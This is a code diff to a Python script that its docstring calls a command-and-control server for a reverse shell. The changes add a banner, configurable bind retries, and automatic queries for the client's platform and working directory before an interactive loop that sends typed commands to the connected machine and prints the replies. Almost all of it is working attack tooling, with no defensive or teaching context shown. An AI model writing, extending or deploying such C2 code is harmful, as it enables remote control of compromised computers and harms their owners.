@@ -7,12 +7,26 @@ class Server(object):
     """
     A simple command and control server(Reverse Shell).
     """
-    def __init__(self, host="", port=6667, recv_size=1024, listen=10):
+    def __init__(self, host="", port=6667, recv_size=1024, listen=10, bind_retry=5):
+        header = """ .oOOOo.
+.O     o.
+O       o               O
+o       O              oOo
+O       o O   o .oOo    o   .oOo. `OoOo.
+o       O o   O `Ooo.   O   OooO'  o
+`o     O' O   o     O   o   O      O
+ `OoooO'  `OoOO `OoO'   `oO `OoO'  o
+              o
+           OoO'                         """
+        print(header)
         self.host = host
-        self.port = port
-        self.recv_size = recv_size
-        self.listen = listen
+        self.port = int(port)
+        self.recv_size = int(recv_size)
+        self.listen = int(listen)
+        self.bind_retry = bind_retry
         self.connection, self.address = False, False
+
+        self.client_platform = ''
 
         # Create the socket
         try:
@@ -32,16 +46,20 @@ class Server(object):
         :return:
         """
 
-        print('Bind the socket to port', self.port)
+        print('Starting on port', self.port, end=', ')
         try:
+            # Bind & start listening.
             self.s.bind((self.host, self.port))
             self.s.listen(self.listen)
-            print('Waiting for client connections...')
+            print('waiting for client connections...', end='\n\n')
+
         except socket.error as error_message:
             print('Could not bind the socket:', error_message, '\n', 'Trying again...')
             sleep(1)
-            if attempts == 5:
-                print('Could not bind the socket to the port after 5 tries.  Aborting...')
+
+            # Try to bind the socket 5 times before giving up.
+            if attempts == self.bind_retry:
+                print('Could not bind the socket to the port after {} tries.  Aborting...'.format(self.bind_retry))
                 sys.exit()
             self._bind_the_socket(attempts=attempts + 1)
 
@@ -52,32 +70,82 @@ class Server(object):
         :return:
         """
 
+        # Accept the connection.
         self.connection, self.address = self.s.accept()
         print('Connection | IP', self.address[0], '| Port', self.address[1])
-        print('> ', end='')
-        self._send_commands()
+
+        # Get details about client.
+
+        # The client platform is used to determine default commands for
+        # getting the current working directory.
+        print('Getting platform... ', end='')
+        self.client_platform = self._send_command('single_command-get_platform')
+        print('Client platform is "{}".'.format(self.client_platform), end='\n\n')
+
+        # Get the current working directory and print it to the console.
+        print(self._send_command('single_command-getcwd'), end='')
+
+        # Start the main command loop
+        self._start_command_loop()
         self.connection.close()
 
-    def _send_commands(self):
+    def _send_command(self, command):
+        """
+        Send a single command to the client, and return the response.
+        This is used for retrieving info from the clients.
+
+        :param command:
+        :return:
+        """
+
+        # Check out the command and make any modifications needed.
+        command = self._check_command(command)
+
+        # Set defaults.
+        response = '> '
+        accepting = True
+
+        if not command:
+            print(response, end='')
+
+        # Send the command
+        self.connection.send(str.encode(command))
+
+        # Accept the response.
+        total_response = ''
+        while accepting:
+            response = str(self.connection.recv(self.recv_size), 'utf-8')
+            total_response += response
+
+            # If we get less data than the total recv buffer, we are done accepting data.
+            if len(response) < self.recv_size:
+                accepting = False
+
+        return total_response
+
+    def _start_command_loop(self):
         """
         Send commands through to the clients.
 
         :return:
         """
 
+        # Loop while accepting input and sending the commands to the client.
         while True:
-            command = input()
+            command = input(' ')
             response = '> '
             accepting = True
-            if self._check_command(command):
-                self.connection.send(str.encode(command))
-                while accepting:
-                    response = str(self.connection.recv(self.recv_size), 'utf-8')
-                    print(response, end='')
-                    if len(response) < self.recv_size:
-                        accepting = False
-            else:
+            command = self._check_command(command)
+            if not command:
                 print(response, end='')
+
+            self.connection.send(str.encode(command))
+            # Accept the response.
+            while accepting:
+                response = str(self.connection.recv(self.recv_size), 'utf-8')
+                print(response.strip(), end='')
+                if len(response) < self.recv_size:
+                    accepting = False
 
     def _check_command(self, command):
         """
@@ -102,8 +170,12 @@ class Server(object):
             sys.exit()
 
         if len(str.encode(command)) > 0:
-            return True
-        return False
+            return command
+        else:
+            if self.client_platform == 'win32':
+                return 'echo'
+            else:
+                return 'echo'
 
 
 if __name__ == '__main__':
@@ -112,12 +184,14 @@ if __name__ == '__main__':
     the_port = 6667
     the_recv_size = 1024
     the_listen = 10
+    the_bind_retry = 5
 
     def check_cli_arg(arg):
         global the_host
         global the_port
         global the_recv_size
         global the_listen
+        global the_bind_retry
 
         if 'host=' in arg:
             the_host = arg.split('=')[1]
@@ -127,6 +201,8 @@ if __name__ == '__main__':
             the_recv_size = int(arg.split('=')[1])
         elif 'listen=' in arg:
             the_listen = int(arg.split('=')[1])
+        elif 'bind_retry=' in arg:
+            the_bind_retry = int(arg.split('=')[1])
 
     for argument in sys.argv[1:]:
         check_cli_arg(argument)
@@ -135,5 +211,6 @@ if __name__ == '__main__':
         host=the_host,
         port=the_port,
         recv_size=the_recv_size,
-        listen=the_listen
+        listen=the_listen,
+        bind_retry=the_bind_retry
     )
